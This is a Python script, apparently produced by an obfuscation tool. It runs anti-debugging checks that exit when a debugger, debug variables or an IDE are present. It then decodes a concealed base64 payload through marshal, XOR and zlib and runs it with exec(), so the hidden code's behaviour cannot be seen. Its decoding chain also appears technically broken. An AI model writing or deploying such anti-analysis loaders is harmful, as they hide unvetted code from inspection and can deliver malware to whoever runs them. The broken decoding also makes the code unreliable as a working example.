#!/usr/bin/env python3
# ULTRA OBFUSCATED - ANTI-DECOMPILE 😈
# Generated: 2026-07-24 10:12:56

import sys, os, zlib, base64, marshal, time, random, hashlib

# ========== ANTI-DEBUG ==========

# ========== ANTI-DEBUG ==========
import sys, os, time, random

def _anti_debug():
    try:
        # Cek debugger
        if sys.gettrace() is not None:
            print("Debugger detected!")
            sys.exit(1)
        # Cek ptrace (Linux)
        try:
            import fcntl
            fcntl.ioctl(0, 0x8004667e, b'x00'*8)
        except:
            pass
        # Cek environment debug
        if "PYTHONDEBUG" in os.environ or "DEBUG" in os.environ:
            sys.exit(1)
        # Cek IDE
        if "PYCHARM_HOSTED" in os.environ:
            sys.exit(1)
        # Delay acak
        time.sleep(random.random() * 0.5)
    except:
        pass

_anti_debug()
del _anti_debug


# ========== PAYLOAD ==========
nw1ilq9_u6y8 = """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"""
r1xbgczcfe = 45
n136f68d = 250
mv0tcfq4yphwh8 = "251ba75a33dbe328"

def bz0qg5():
    try:
        # ===== DECODE =====
        sn1v0s9dagmol333 = base64.b64decode(nw1ilq9_u6y8)
        _data = marshal.loads(sn1v0s9dagmol333)
        
        # ===== XOR DECRYPT =====
        _data = bytes([b ^ n136f68d for b in _data])
        _data = bytes([b ^ r1xbgczcfe for b in _data])
        
        # ===== DECOMPRESS =====
        _code = zlib.decompress(_data).decode('utf-8')
        
        # ===== INTEGRITY CHECK =====
        _check = hashlib.sha256(_code.encode()).hexdigest()[:16]
        if _check != mv0tcfq4yphwh8:
            print("[!] Integrity check failed!")
            sys.exit(1)
        
        # ===== EXECUTE =====
        exec(_code, globals())
    except Exception as _e:
        print(f"[!] Error: {_e}")
        sys.exit(1)

if __name__ == "__main__":
    bz0qg5()
